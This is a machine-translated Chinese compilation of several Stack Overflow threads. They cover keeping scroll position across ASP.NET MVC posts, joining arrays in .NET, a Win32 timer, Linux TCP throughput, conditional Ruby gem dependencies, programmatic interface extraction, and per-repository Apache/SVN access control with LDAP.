        window.scrollTo(theForm.elements['__SCROLLPOSITIONX'].value, theForm.elements['__SCROLLPOSITIONY'].value);
    }
    else {
        window.scrollTo(theForm.__SCROLLPOSITIONX.value, theForm.__SCROLLPOSITIONY.value);
    }
    if ((typeof(theForm.oldOnLoad) != "undefined") && (theForm.oldOnLoad != null)) {
        return theForm.oldOnLoad();
    }
    return true;
} 
```

但正如大多数人所说，MVC 无论如何都应该避免回发。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-01-27T18:20:02.427

实际上没有标准的处理方式，这是微软为了支持他们的回发模型而进行的黑客攻击。他们需要这个，因为每个控件都会发回一个帖子，并且用户会不断地被推回页面顶部。

与 MVC 一起使用的建议是使用 AJAX 将您的大部分回帖返回到服务器。这样页面就不必重新渲染焦点不会移动。jQuery 让 AJAX 变得非常简单，甚至还有默认的表单，比如

```
<% Ajax.BeginForm(...) %> 
```

它将为您处理 AJAX 方面的事情。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2011-07-13T19:57:01.057

从 WebForms 和 Richard Gadsden 提供的答案中汲取灵感，另一种使用 javascript 和表单集合的方法可能如下所示：

```
@{
    var scrollPositionX = string.Empty;        
    if(IsPost) {
        scrollPositionX = Request.Form["ScrollPositionX"];
    }
}

<form action="" method="post">
    <input type="hidden" id="ScrollPositionX" name="ScrollPositionX" value="@scrollPositionX" />
    <input type="submit" id="Submit" name="Submit" value="Go" />
</form>

$("#Submit").click(function () {
    $("#ScrollPositionX").val($(document).scrollTop());
});

$("#ScrollPositionX").each(function () {
    var val = parseInt($(this).val(), 10);
    if (!isNaN(val))
        $(document).scrollTop(val);
}); 
```

提供的代码是为了灵感，绝不是美化的。它可能可以通过几种不同的方式完成，我想这一切都取决于您决定如何在 POST 中保留文档的 scrollTop 值。由于我们使用 jQuery 进行滚动，因此它可以正常工作并且应该是跨浏览器安全的。我相信提供的代码是不言自明的，但我很乐意提供更详细的描述，让我知道。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-01-27T18:14:59.630

我自己的解决方法是使用一些信息`ViewData`来了解必须在后退导航中显示哪些区域，并使用一些 javascript 来定位页面的光标：

在视图中，像这样的元素：

```
<h3 id="tasks">
    Contained tasks
</h3> 
```

以及重新定位页面的javascript：

```
<script type="text/javascript">
    addOnLoad(goAnchor);

    function goAnchor() {
        var paging = <%= //Here you determine (from the ViewData or whatever) if you have to position the element %>;
        if (paging == "True") {
            window.location.hash = "tasks";
        }
</script> 
```

您可以使用 a`switch`来确定必须重新定位视图页面中的哪些元素。

希望能帮助到你。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2011-01-18T06:42:35.860

我在标签中使用了名称属性。没有使用 JavaScript。

我想返回的页面有 <a> 带有 name 属性的标签，例如 <a name="testname">。

我从使用标签 <a href="<%: Request.UrlReferrer %>#testname">Back</a>" 返回的页面（视图）。Request.UrlReferrer 用于转到上一页。#testname 滚动页面用名称“testname”标记的位置。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2010-06-15T04:36:30.820

```
<%
   if(!ViewData.ModelState.IsValid)
   {
%>
   window.location.hash = 'Error';
<%
   }
%>

 <a name="Error"></a> 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2011-05-08T23:10:41.427

这是一个简单的纯 Javascript 解决方案，我仅在 FF4 和 IE9 中测试过。

这个想法是，这个解决方案应该通过回退到`#anchor`页面上的标准标签来优雅地降级。我正在做的是用`#anchor`X 和 Y 坐标动态替换这些标签，然后在加载时，我只需从查询字符串中读取这些值并在那里滚动。如果由于某种原因失败，浏览器仍应导航到该`#anchor`位置...

标记：

```
<a href="/somecontroller/someaction/#someanchor">My Link</a> 
```

jQuery：

```
$(function() {

// RESTORE SCROLL POSITION
RestoreScrollPosition();

// SAVE SCROLL POSITION
$('a:not(a[href^="http"])').filter('[href$="#someanchor"]').each(function() {
    $(this).click(function() {
        var href = $(this).attr('href').replace("#someanchor","");
        if (href.indexOf('?') == -1) {
            href = href + '?x='
        } else {
            href = href + '&x='
        }
        href = href + window.pageXOffset;
        href = href + '&y=' + window.pageYOffset;
        $(this).attr('href', href);
    });
});
} 
```

几个辅助方法：

```
function RestoreScrollPosition() {

    var scrollX = gup('x');
    var scrollY = gup('y');

    if (scrollX != null && scrollY != null) {
        window.scrollTo(scrollX, scrollY);
        return true;
    }
    return false;
}

function gup(name) {
    name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
    var regexS = "[\\?&]" + name + "=([^&#]*)";
    var regex = new RegExp(regexS);
    var results = regex.exec(window.location.href);
    if (results == null)
        return "";
    else
        return results[1];
} 
```

这符合我的需求，但可能更通用/可重用 - 我很高兴有人对此进行改进...... :-)

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-01-27T18:25:04.197

一个非常不好的方法是使用 cookie。

如果您在 MVC 中使用一个页面来处理其他页面，您可以为其添加一个代码片段，以加载每个页面，该页面会创建一个名为“scrolltop”的 cookie（如果不存在）。当用户向上或向下滚动时，通过捕获这些事件或查看 scrollTop 值，有一些方法可以让 javascript 自动更新此 cookie。

在一个新页面上，您只需要加载保存的位置并让视图在 0 毫秒内滚动到那里（使用 Mootools 或任何 Ajax 脚本，这应该是可能的），用户将准确地回到他们所在的位置。

我对asp了解不多，所以我不知道是否存在锚定到当前y位置的方法。Javascript 是一种快速简便的方法。如果您已锚定每个元素并将锚点发布到其他页面，则 HTMl 中的锚点可能是一种选择。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2013-12-31T20:08:21.763

我使用 .scrollTop 如下所示，非常简单，它甚至可以在视图中使用多个表单（我的视图很长，分解为多个表单）：

首先将此属性放入模型中：

```
 public string scrollTop { get; set; } 
```

在视图中，在表格 #1 内：

```
 @Html.HiddenFor(m => m.scrollTop, new {@id="ScrollForm1"}) 
```

在表格 #2 内：

```
 @Html.HiddenFor(m => m.scrollTop, new {@id="ScrollForm2"}) 
```

在表格 #2 内：

```
 @Html.HiddenFor(m => m.scrollTop, new {@id="ScrollForm3"}) 
```

然后在视图的底部：

```
 $(document).ready(function () {
    $(document).scrollTop(@Model.scrollTop);
    $(document).scroll(function () {
        $("#ScrollForm1").val($(document).scrollTop());
        $("#ScrollForm2").val($(document).scrollTop());
        $("#ScrollForm3").val($(document).scrollTop());
      });
   }); 
```

您的滚动位置始终在回发时保留，因为 @Html.HiddenFor 字段存储您当前的滚动并将其传递给发布时的模型。然后，当页面出现时，它会从模型中获取 scrollTop 值。最后，您的页面将表现得像网络表单，一切都保持不变。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2019-12-05T08:36:22.997

10 年过去了，一个不同的 JS 解决方案。另一个 JS 解决方案等待页面滚动，当页面加载时滚动到保存的任何位置。这对大多数人来说都很好（尽管它不会删除该值，因此当您查看该页面时页面总是会滚动到该位置......）。我的解决方案是等待表单提交：

（是的，它使用的是 jQuery，但该网站有很多...）

```
 // OWNER'S FORM POSITION
    if ($("[js-owner-request]").length) {
        $("[js-owner-request]").on("submit", function() {
            localStorage['owner-request__scrollTop'] = $(this).offset().top;
        });

        if (localStorage['owner-request__scrollTop'] !== "null") {
            $(document).scrollTop(localStorage['owner-request__scrollTop']);
            localStorage['owner-request__scrollTop'] = "null"; // set to null so we don't always scroll...
        }
    } 
```

这将滚动回表单的顶部，这样任何错误消息都将可见，因为您可能已经滚动到验证摘要之外。

* * *

## 回答 #12

> 赞同：-1
> 
> 时间：2016-06-30T09:37:09.207

```
@{

}

<html>

<head>
    <script type="text/javascript">

window.onload = function () {
    var div = document.getElementById("dvScroll");
   var div_position = document.getElementById("div_position");
    var position = parseInt(@Request.Form("div_position"));
    if (isNaN(position)) {
        position = 0;
    }

    div.scrollTop = position;
    div.onscroll = function () {
        div_position.value = div.scrollTop;
    };
};

</script>
</head>

<body>

<div id="dvScroll" style="overflow-y: scroll; height: 260px; width: 300px">

    1\. This is a sample text

    <br />

    2\. This is a sample text

    <br />

    3\. This is a sample text

    <br />

    4\. This is a sample text

    <br />

    5\. This is a sample text

    <br />

    6\. This is a sample text

    <br />

    7\. This is a sample text

    <br />

    8\. This is a sample text

    <br />

    9\. This is a sample text

    <br />

    10\. This is a sample text

    <br />

    11\. This is a sample text

    <br />

    12\. This is a sample text

    <br />

    13\. This is a sample text

    <br />

    14\. This is a sample text

    <br />

    15\. This is a sample text

    <br />

    16\. This is a sample text

    <br />

    17\. This is a sample text

    <br />

    18\. This is a sample text

    <br />

    19\. This is a sample text

    <br />

    20\. This is a sample text

    <br />

    21\. This is a sample text

    <br />

    22\. This is a sample text

    <br />

    23\. This is a sample text

    <br />

    24\. This is a sample text

    <br />

    25\. This is a sample text

    <br />

</div>

<hr />
<form method="post">
<input type="hidden" id="div_position" name="div_position" />
<input type="submit" value="Cool" />
    </form> 
</body>
</html>
```

您可以使用它在回发后保持滚动位置。

资料来源：[http ://www.aspsnippets.com/Articles/Maintain-Scroll-Position-of-DIV-on-PostBack-in-ASPNet.aspx](http://www.aspsnippets.com/Articles/Maintain-Scroll-Position-of-DIV-on-PostBack-in-ASPNet.aspx)

# arrays - Array.Join 在 .Net 中？

> ID：484464
> 
> 赞同：35
> 
> 时间：2009-01-27T17:54:08.453
> 
> 标签：arrays, join, .net-2.0

好的，这是一件愚蠢的事情，我确信我已经做了几十次，但由于某种原因我找不到它。

我有一个数组...并且想要获取一个字符串，该字符串的内容由分隔符分隔...

我找不到的 .Join() 方法在哪里？

（这是 .Net 2.0，我没有任何 LINQ 的东西）

谢谢！

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2009-01-27T17:56:13.520

如果您正在使用字符串，那么[`String.Join`](https://docs.microsoft.com/en-us/dotnet/api/system.string.join)可能就是您正在寻找的。

* * *

## 回答 #2

> 赞同：30
> 
> 时间：2009-01-27T17:56:51.943

它在字符串类

```
String.Join(",", new string[] {"a", "b", "c"}); 
```

编辑整数到字符串

```
 int[] integers = new int[] { 1,2,3,4,5 };
 String.Join(",", Array.ConvertAll<int, String>(integers, Convert.ToString)); 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-01-27T17:59:38.037

如果你有一个数组，`strings`你可以调用[`String.join(String, String[])`](http://msdn.microsoft.com/en-us/library/57a79xd0.aspx). 即使你没有数组`strings`，你也可以使用它，你只需要能够将你的转换`objects`为`strings`

```
object[] objects = ...
string[] strings = new string[objects.Length];
for (int i = 0; i < objects.Length; i++)
  strings[i] = objects[i].ToString();
string value = String.Join(", ", strings); 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2011-10-21T15:12:07.030

```
Dim arrStrIds() As String = Array.ConvertAll(arrIntIds, New Converter(Of Integer, String)(
 Function(id As Integer) id.ToString()) )

String.Join(",", arrStrIds) 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-01-27T18:31:48.223

您可以使用 LINQ to Objects 并为自己节省几行代码

```
int [] ints = { 0, 1, 2 };
string[] intStrings = (from i in ints select i.ToString()).ToArray<string>();
string joinedStrings = string.Join(",", intStrings); 
```

糟糕，刚刚看到您没有 LINQ，抱歉。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-27T18:02:37.987

[您可以在String 类](http://msdn.microsoft.com/en-us/library/57a79xd0.aspx)中找到该方法。

**使用拆分和连接的示例：**

```
 public static void Main() { 

    string str = "on two three, four five six."; 
    char[] separators = {' ', '.', ',' }; 

    // Split the string:
    string[] parts = str.Split(separators); 

    string allTogether = String.Join(" | ", parts); 

    Console.WriteLine("Joined: "); 
    Console.WriteLine(allTogether); 

  } 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2011-09-22T18:54:13.373

您不需要在 .NET Framework 4 中将数组转换为字符串数组。我不了解以前的框架。所以前面的代码花费了几行将您的 int 数组转换为字符串数组。只需跳过该步骤（如果它也适用于您的框架）。

```
string[] sA = "11,12,13".Split(',');
int[] iA = { 21, 22, 23};
Console.WriteLine(string.Join("+", iA) + " -- " + string.Join("+", sA));

/* displays:
21+22+23 -- 11+12+13
*/ 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-12-22T17:17:12.357

如果你真的喜欢 Array.Join 的人体工程学，你可以像这样添加一个[扩展方法](https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/classes-and-structs/extension-methods)：

```
public static class MyExtensions {
    public static string Join(this IEnumerable<string> arr, string seperator) =>
        string.Join(seperator, arr);
} 
```

然后像这样使用：

```
var list = new string[] {"A", "B", "C"};
var output = list.Join(",");
// "A,B,C" 
```

### [.NET Fiddle 中的演示](https://dotnetfiddle.net/4HMObc)

# c++ - 在屏幕上创建计时器的最佳方法

> ID：484466
> 
> 赞同：3
> 
> 时间：2009-01-27T17:54:28.610
> 
> 标签：c++, c, winapi, gdi

我有在屏幕上创建一个倒计时的想法，比如 01:02（全尺寸）。有一件事是我真的不知道如何开始。

我确实知道基本的 c/c++、win32 api 和一点 gdi。

有人对如何开始有任何指示吗？我的程序就像将计算机变成一个大秒表（但具有附加功能）

不要求代码，只是一些关于如何开始的想法/入门。主要做网络工作让我对 win 编程有点生疏了。

欢迎任何想法

谢谢

注意：由于速度的原因，我认为我必须使用 c/c++ 来执行此操作。我的秒表程序会在非常慢的电脑上运行，比如 p3 800mhz，所以速度真的很重要。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T18:48:13.057

如果您对 Windows 消息处理和 Win32 API 有一定的经验，这应该可以帮助您入门。

```
LRESULT WndProc (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) 
{ 
  HDC hdc; 
  PAINTSTRUCT ps; 
  RECT r; 
  char szBuffer[200]; 
  static int count = 120; 
  int seconds = 0;
  int minutes = 0;
  int hours  = 0;

  switch (message) { 
  case WM_CREATE: 
    // create a 1 second timer 
    SetTimer (hwnd, ID_TIMER, 1000, NULL); 
    return 0;      

  case WM_PAINT:
    if(count > 0)
    {
        hdc = BeginPaint (hwnd, &ps); 
        GetClientRect (hwnd, &r);
        hours = count / 3600;
        minutes = (count / 60) % 60;
        seconds = count % 60;
        wsprintf (szBuffer, "Hours: %d Minutes: %d Seconds: %d", hours, minutes, seconds); 
        DrawText (hdc, szBuffer, -1, &r, DT_LEFT); 
        EndPaint (hwnd, &ps); 
    }
    else
    {
        SendMessage (hwnd, WM_CLOSE, 0, 0L)
    }
    return 0; 

  case WM_TIMER: 
    count--;       
    InvalidateRect (hwnd, NULL, TRUE);
    return 0;        

  case WM_DESTROY: 
    KillTimer (hwnd, ID_TIMER); 
    PostQuitMessage (0); 
    return 0; 
  }  /* end switch */ 
 } 
```

这是使用计时器的一个很好的链接：

[使用定时器](http://msdn.microsoft.com/en-us/library/ms644901(VS.85).aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-27T18:08:23.667

创建一个计时器，让您的应用程序通过向自身发送绘制消息来响应计时器事件。确保在应用退出时删除计时器。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-29T10:43:36.460

时钟以每秒换屏一次的速度运行；一个 800MHz 的 CPU 每秒处理大约 8 亿条指令。这比您需要的多 7.99 亿，因此效率不是问题。它仍然可以在浏览器内的 Jvascript 中工作。但这并不意味着 C 或 C++ 不合适。

The easiest way to program Win32 is through a supporting library. wxWidgets and Qt are good choices, and both free. They save you quite a bit on the nuts & bolts side. Basically, in both you'd create a Window object containing a textbox object and a timer object, and you'd just wire the timer tick to a text update.

# linux - Linux 套接字缓冲区不平衡

> ID：484470
> 
> 赞同：4
> 
> 时间：2009-01-27T17:55:25.677
> 
> 标签：linux, performance, tcp

我有一个简单的场景，其中两台服务器通过千兆链路连接。我在两边都运行 iperf 来测量吞吐量。

令我惊讶的是，每当我双向运行流量时，它总是只支持一侧（例如~900Mbps vs.~100Mbps）。如果我单向运行流量，每一方都有~900Mbps。

如果我将其中一台服务器（较低的内存）连接到另一台服务器，则双向流量会被平衡。所以绝对不是iperf问题。

其他事实：

*   一台服务器有相当大的内存（~12GB），而另一台只有~4GB。
*   两台服务器具有相同的 TCP 内存配置，在这种情况下，相同的 TCP w/r mem、core w/r mem、TX 队列长度。
*   两者都使用相同的以太网卡（E1000 驱动程序）。
*   相同的 Linux 版本，RedHat 2.6.9。由于 12GB 内存，大型服务器运行 64 位版本。
*   两者都没有其他流量，除了小 SSH 和偶尔的每秒 ping。
*   两者都打开了“tcp_moderate_rcvbuf”。

问题：

1.  为什么不平衡？
2.  我应该查看哪个区域以查看套接字缓冲区是否在一侧被大量使用，以及如何？
3.  除了 iperf，还有什么其他好的软件（不是硬件/测试仪）来衡量性能？
4.  了解 Linux 如何从以太网环形缓冲区、TCP 缓冲区、套接字缓冲区和其他缓冲区分配缓冲区的最佳方法是什么？
5.  可能影响我上面没有提到的吞吐量的其他实体可能是什么？
6.  是否有任何文档解释 Linux 如何在用户、内核、设备驱动程序和网络堆栈之间分配内存分配？

任何建议都深表感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-28T02:52:00.490

建议：

*   查看以太网接口上的实际设置。“ethtool”是一种彻底了解的方法。“ifconfig”告诉你一些东西，虽然更少。（可能都在 /usr/sbin/ 中。）使用“dmesg”查找内核消息可能会告诉你一些事情。查看链接错误率也可能会揭示一些东西。
*   查询您的交换机以了解其端口状态的想法也可能会揭示真正发生的事情。（如果您只是在接口之间使用 CAT5 电缆，没有开关，则不相关。）
*   由于一对机器按您的预期工作，而另一对机器没有，我正在考虑双工自动协商的一些异常情况。半双工对于 GigE 来说是不常见的，但可能是您的交换机或 NIC 导致了它。在任何地方发现半双工设置，或者特别是主机与其交换机之间关于端口状态的分歧，都可能是原因。

# ruby - 条件 gem 依赖

> ID：484482
> 
> 赞同：8
> 
> 时间：2009-01-27T17:57:21.273
> 
> 标签：ruby, rubygems, jruby

是否可以在安装时有条件地设置对 gem 的依赖？这是我的情况，希望能澄清这个问题。

我维护的一个 gem 依赖于 json gem。但是，我经常使用 jruby，它有一个名为 json-jruby 的 json gem 端口。要解决这个问题，我必须为每个依赖项构建两个单独的 gem。我想构建一个 gem，它要么说它依赖于 json 或 json-jruby，要么它在安装时检查并使用正确的依赖项。

有人对此有很好的解决方案吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T18:43:43.643

唔，

我相信可以编写多个依赖项，因为我注意到 gems 似乎可以做到这一点。但我建议你不要这样做。无论您在此处插入的代码多么简单，当您考虑到用户将加载一个依赖于另一个依赖于另一个的 gem 时，即使是一段或另一段代码的逻辑中的一个小故障也可以使整个依赖训练一场噩梦。

所以，我会让你的杂物保持原样。此外，我建议您有一个用户也可以下载的 tarball。我不得不手动提取配置代码不允许我安装它们的 gem 中的代码。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-12-15T17:49:26.017

在这里查看一些教程：[https](https://github.com/rdp/ruby_tutorials_core/wiki/gem) ://github.com/rdp/ruby_tutorials_core/wiki/gem （[https://en.wikibooks.org/wiki/Ruby_Programming/RubyGems](https://en.wikibooks.org/wiki/Ruby_Programming/RubyGems)）

它显示了如何根据安装者使用的 ruby​​ 版本安装不同版本的依赖项。

（简短的回答——它并不像应该的那么容易）

# .net - 有没有办法以编程方式提取接口？

> ID：484489
> 
> 赞同：6
> 
> 时间：2009-01-27T17:59:23.343
> 
> 标签：.net, visual-studio, refactoring

假设我有一个像这样的 .NET 类：

```
public class Person {
    public string Name { get; set; }
    public int Id { get; set; }
} 
```

Visual Studio 有一个名为 Extract Interface 的漂亮重构工具，它可以提取`IPerson`接口并`Person`实现它。有没有办法从 Visual Studio 外部以编程方式做到这一点？如果不能以编程方式完成，我什至会使用 shell 脚本。

[编辑] 实际上，我最多有 50 个类，每个类都相互依赖。

反射会起作用，但它会给整个事情带来另一个皱纹。这些类已经由 生成`xsd.exe`。因此，如果我理解正确，我需要采取的步骤是：

1.  从生成类`xsd.exe`。
2.  即时编译类，以便我可以使用反射。
3.  反映它们，发出接口，并编辑原始类以实现所述接口。

一般来说，我赞成放弃接口并直接使用类，但由于各种原因我不能。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-11-13T09:24:03.147

后来我遇到了同样的问题，找到了上面接受的解决方案，并决定在此处添加更多信息和详细信息，以了解我如何使用反射和其他功能以编程方式在源代码中生成接口。**（如果您不关心使用自定义属性标记源代码以生成代码，请跳过这第一块代码）**

为了灵活性，我创建了名为*GenerateInterface* 和*GenerateInterfaceMember*的自定义属性（只是我自己的创作）来标记我想要明确导出到接口的部分的类和成员（或者您可以默认导出所有公共成员，无论您喜欢什么）。例如，我将这样的属性应用于 Store 类......

```
[GenerateInterface(InterfaceName="IStore", NamespaceName="Com.Example.GenerationTest")]
class Store : BusinessObject {
    string _name;

    [GenerateInterfaceMember]
    public event EventHandler handler;

    internal Store(IDomain domain, string name)
        : base(domain) {
        _name = name;
    }

    [GenerateInterfaceMember]
    public string GetSomething(int a, int b, Random r, Store s) {
        throw new NotImplementedException();
    }
//etc... 
```

有关[自定义属性的信息，请参阅 MSDN](http://msdn.microsoft.com/en-us/library/z0w1kczw.aspx)。

**代码生成的东西...**

*注意：您可以在不使用上面显示的自定义属性的情况下执行以下所有操作。*

我使用[反射](http://msdn.microsoft.com/en-us/library/cxz4wk15(VS.80).aspx)来迭代类型和成员。您只需要获取类中的所有公共成员作为创建接口的候选对象。

在使用反射在 System.Type 上获取 System.Reflection.PropertyInfo、.MethodInfo 等实例后，我创建了一个与语言无关的代码编译单元，由[System.CodeDom.CodeCompileUnit 类表示，其中 MSDN 有很好的例子代码 - 在这里看到。](http://msdn.microsoft.com/en-us/library/system.codedom.codecompileunit.aspx). 代码编译单元实例是您需要构建的，以描述您希望以独立于语言的方式生成的源代码。

创建 CodeCompileUnit 实例后，您可以将其提供给各种 FCL 方法以满足您的需求，例如生成源代码、在内存或磁盘中发送 MSIL 代码等。要生成源代码，我使用[了 System.CodeDom.Compiler.CodeDomProvider 参见](http://msdn.microsoft.com/en-us/library/system.codedom.compiler.codedomprovider(VS.80).aspx)除了下面一起破解的解决方案之外，[MSDN 示例...](http://msdn.microsoft.com/en-us/library/system.codedom.compiler.codedomprovider(VS.80).aspx)

CodeDomProvider 是特定语言的地方 - 这些语言嵌套在 Microsoft 命名空间下，例如：

```
using Microsoft.CSharp; // for C#
using Microsoft.VisualBasic; // for VB.NET 
```

有几种方法可以创建 CodeDomProvider 实例，例如此处的 MSDN 代码示例显示了一个静态方法“.CreateProvider”：

```
CodeDomProvider provider = null;
// snip...
case "CSharp":
   provider = CodeDomProvider.CreateProvider("CSharp");
   break;
case "Visual Basic":
   provider = CodeDomProvider.CreateProvider("VisualBasic");
   break; 
```

或者，您可以直接实例化提供程序

```
Microsoft.CSharp.CSharpCodeProvider csProvider = new CSharpCodeProvider();
Microsoft.VisualBasic.VBCodeProvider vbProvider = new VBCodeProvider(); 
```

在提供者实例上使用方法，如[provider.GenerateCodeFromCompileUnit(..)](http://msdn.microsoft.com/en-us/library/system.codedom.compiler.codedomprovider.generatecodefromcompileunit.aspx)并将您的 CodeCompileUnit 实例提供给它。此示例代码为 StringBuilder 实例生成 C# 源代码。

```
// me setting up string capture for my purposes
StringBuilder szBuilder = new StringBuilder();
StringWriter writer = new StringWriter(szBuilder);

// the key statement - writes c# code to StringBuilder using provider instance and compile unit instance
csProvider.GenerateCodeFromCompileUnit(compileUnit, writer, new CodeGeneratorOptions());

// solidifying the generated C# code into one string
string sourceCode = szBuilder.ToString(); 
// can write this string to a file, etc.... 
```

你已经生成了源代码。

在输出 sourceCode 字符串时，我最终得到了类似这样的东西。微软在关于自动生成的文件的评论前面加上了很好的评论——让它感觉更“正式”。

```
//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:2.0.50727.4200
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace Com.Example.GenerationTest {
    using System;
    using Com.Example.BusinessCore;

    public interface IStore {

        string Name {
            get;
            set;
        }

         event System.EventHandler handler;

        string GetSomething(int a, int b, System.Random r, Store s);
    }
} 
```

我的小免责声明：有很多方法可以生成和发出代码。这里展示的是一种以编程方式生成源代码的方法。有些方法有重载并采用复杂的参数——你必须在 MSDN 中查找错综复杂的内容。一些方法在 1.1、2.0 等之间发生了变化。最后，一些完成代码生成的方法已经过时，已被替代方法所取代；MSDN 记录了所有这些内容。

希望此处显示的代码可作为开始以编程方式生成接口或为此生成任何类型代码的指南。

注意：此示例未显示如何将生成的源代码与现有代码集成，或者如何将其发送到 MSIL 或附加到现有的程序集文件中 - 我看到的其他答案显示了与这些解决方案相关的示例。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-01-27T18:23:17.070

一句话：反思。

编写一些代码来获取类对象、反映其公共方法并编写一个文本文件是该类实现的接口的定义，这是非常可行的。

然而，决定哪些方法属于一个接口（例如，一个类可能实现多个，对吗？）并在类的源代码中添加正确的符号需要更多的工作。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-27T18:41:55.503

你能详细说明你为什么要这样做吗？

我无法想象我需要这个而不是正常的反射东西的情况。

为什么要发出接口类型而不是直接使用类中的类型信息？

这是一个不那么快速的代码示例，它发出一个类型的所有公共属性的接口：

```
using System;
using System.Linq;
using System.Reflection;
using System.Reflection.Emit;

static class Program
{

    public class Person
    {
        public string Name { get; set; }
        public string Email { get; set; }
    }

    static void Main()
    {
        var personType = typeof(Person);

        // create a new assembly and module
        var asmBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(
            new AssemblyName("IPerson"),
            AssemblyBuilderAccess.RunAndSave);

        var moduleBuilder = asmBuilder.DefineDynamicModule(
            "IPerson", "IPerson.dll");

        // create a new interface type
        var typeBuilder = moduleBuilder.DefineType("IPerson",
            TypeAttributes.Public
            | TypeAttributes.Abstract
            | TypeAttributes.Interface);

        // build properties
        foreach (var prop in personType.GetProperties()) {
            var propBuilder = typeBuilder.DefineProperty(
                prop.Name, prop.Attributes,
                prop.PropertyType, Type.EmptyTypes);

            // build the getters and setters method if a public one was available
            var getter = prop.GetGetMethod();
            var setter = prop.GetSetMethod();

            var attr = MethodAttributes.Public
                | MethodAttributes.Virtual
                | MethodAttributes.Abstract;

            if (getter != null && getter.IsPublic)
                propBuilder.SetGetMethod(typeBuilder.DefineMethod(
                    getter.Name, attr,
                    getter.ReturnType,
                    getter.GetParameters().Select(p => p.ParameterType).ToArray()
                ));

            if (setter != null && setter.IsPublic)
                propBuilder.SetSetMethod(typeBuilder.DefineMethod(
                    setter.Name, attr,
                    setter.ReturnType,
                    setter.GetParameters().Select(p => p.ParameterType).ToArray()
                ));

        }

        // complete the type creation
        typeBuilder.CreateType();

        // save the result to a file
        asmBuilder.Save("IPerson.dll");
    }

} 
```

`IPerson.dll`您可以在 Reflector 中加载结果以查看结果。

我认为您可以从那里构建以满足您的需求。

正确构建整个界面太复杂了，无法在这里彻底讨论。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-27T18:30:17.557

如果我正确理解您的问题，您想编写一个程序，当给定类名时，将输出其方法/字段与给定类匹配的接口的源代码。[您可以使用 .NET 的反射](http://msdn.microsoft.com/en-us/library/cxz4wk15.aspx)库轻松编写这样的程序。特别是，[System.Type](http://msdn.microsoft.com/en-us/library/system.type.aspx)类具有诸如[GetMethods](http://msdn.microsoft.com/en-us/library/4d848zkb.aspx)之类的方法，它允许您遍历类型中定义的所有方法并选择要包含在您的接口中的方法。

决定提取哪些方法是一个更困难的问题。例如，您想包含其他接口中已经定义的方法吗？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-28T00:12:11.420

也许您可以利用 xsd.exe 生成的类是部分的这一事实？！

# svn - 如何限制 Apache/SVN 对特定用户的访问（基于 LDAP/文件的身份验证）？

> ID：484499
> 
> 赞同：6
> 
> 时间：2009-01-27T18:01:22.637
> 
> 标签：svn, authentication, active-directory, ldap, apache2

我在 Windows Server 2003 上运行 Apache/SVN，通过 LDAP/Active Directory 和平面文件进行身份验证。

*除了任何*LDAP 用户都可以访问所有内容之外，它工作得很好。我希望能够按用户或组限制 SVN 存储库。

理想情况下，我会得到这样的东西：

```
<Location /svn/repo1>
  # Restricted to ldap-user1, file-user1, or members of ldap-group1,
  # all others denied
</Location>

<Location /svn/repo2>
  # Restricted to ldap-user2, file-user2, or members of ldap-group2,
  # all others denied
</Location> 
```

真正的技巧可能是我混合了身份验证：LDAP 和文件：

```
<Location /svn>
  DAV svn
  SVNParentPath C:/svn_repository
  AuthName "Subversion Repository"
  AuthType Basic
  AuthBasicProvider ldap file
  AuthUserFile "svn-users.txt" #file-based, custom users
  AuthzLDAPAuthoritative On
  AuthLDAPBindDN ldapuseraccount@directory.com
  AuthLDAPBindPassword ldappassword
  AuthLDAPURL ldap://directory.com:389/cn=Users,dc=directory,dc=com?sAMAccountName?sub?(objectCategory=person)
  Require valid-user
</Location> 
```

* * *

在我的谷歌搜索中，我看到有些人通过`authz`像这样拉入文件来实现这一点：

```
<Location /svn>
  ...
  AuthzSVNAccessFile "conf/svn-authz.txt"
</Location 
```

然后，我需要映射 AD 用户。这种方法的任何例子？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-01-27T18:57:23.227

这实际上比我想象的要容易得多。我将此添加到我的位置：

```
<Location /svn>
  ...
  AuthzSVNAccessFile "conf/svn-authz.txt"
</Location 
```

在那个文件中，我只是指定了普通的 SVN 权限（此时系统似乎没有区分文件用户和 LDAP 用户）：

```
[groups]
@admin = haren

###
### Deny all but administrators to the tree
###

[/]
* =
@admin = rw

###
### Allow more specific people on a per-repository basis below
###

[repo1:/]
ldap-user1 = rw
file-user1 = rw

[repo2:/]
ldap-user2 = rw
file-user2 = rw 
```

我仍在使用 LDAP 组语法来使该部分正常工作。有任何建议表示赞赏。

* * *

## 回答 #2

